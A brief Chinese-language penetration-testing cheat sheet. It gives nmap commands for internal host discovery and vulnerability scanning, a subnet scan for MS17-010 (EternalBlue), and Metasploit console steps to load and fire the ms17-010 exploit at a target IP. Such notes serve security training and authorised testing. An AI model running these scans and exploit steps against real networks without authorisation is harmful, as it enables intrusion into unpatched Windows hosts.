2020-03-23
Visibility: Public



内网IP存活：
```
nmap -sP 192.168.1.1-225

                       nmap -sP 192.168.1.1/24

                       nmap -sn 192.168.1.1-225

                       nmap -sn 192.168.1.1/24
```


单IP扫描漏洞: 
```
nmap --script=vuln "ip"
```



扫描永恒之蓝: 
```
nmap -p 445 --script=smb-vuln-ms17-010 192.168.1.102/24
```




利用ms17-010: `msfconsole`
```

msf5> search ms17-010

msf5> use 3

msf5> show options

msf5> set rhost="ip"

msf5> exploit
```